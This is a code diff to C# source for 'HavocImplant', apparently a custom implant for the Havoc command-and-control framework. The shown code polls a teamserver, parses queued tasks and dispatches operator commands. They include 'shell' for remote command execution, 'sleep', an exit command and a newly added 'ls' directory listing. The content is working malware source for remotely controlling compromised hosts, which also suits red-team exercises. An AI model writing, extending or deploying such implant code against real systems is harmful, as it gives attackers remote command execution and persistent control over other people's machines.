@@ -85,10 +85,13 @@ namespace HavocImplant
                 }
                 string rawTasks = implant.CheckIn(cumalativeOutput);
 
+                // Chunk of 4 = size = there is a task that is being sent to implant
                 if (rawTasks.Length > 4)
                 {
                     int offset = 0;
                     string task = "";
+
+                    // Parsing the raw request from teamserver, splitting task into dictionary entries
                     while (offset < rawTasks.Length)
                     {
                         
@@ -112,7 +115,8 @@ namespace HavocImplant
 
                     Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);
 
-                    for (int i = 0; i < implant.taskingInformation.Count; i++)
+                    // Parsing the commands from the dictionary
+                    for (int i = 0; i < implant.taskingInformation.Count; i++) 
                     {
                         string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;
                         Console.WriteLine("Read command: {0}", command);
@@ -120,21 +124,21 @@ namespace HavocImplant
                         int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                         Console.WriteLine("The ID is: {0}", taskId);
 
-                        List<byte> commandBytes = Encoding.UTF8.GetBytes(command.Split(' ')[0]).ToList();
-                        commandBytes.Remove(0x00);
-                        Console.WriteLine("Length is: {0}", Encoding.UTF8.GetString(commandBytes.ToArray()).Length);
-                        string sanitizedCommand = Encoding.UTF8.GetString(commandBytes.ToArray());
-                        switch (sanitizedCommand.Split(' ')[0])
+                        switch (command.Split(' ')[0])
                         {
                             case "shell":
-                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5), taskId));
+                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
                                 shellThread.Start();
                                 break;
                             case "goodbye":
                                 Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
                             case "sleep":
-                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5), taskId));
+                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
                                 sleepThread.Start();
+                                break;
+                            case "ls":
+                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
+                                lsThread.Start();
                                 break;
                         }
                     }
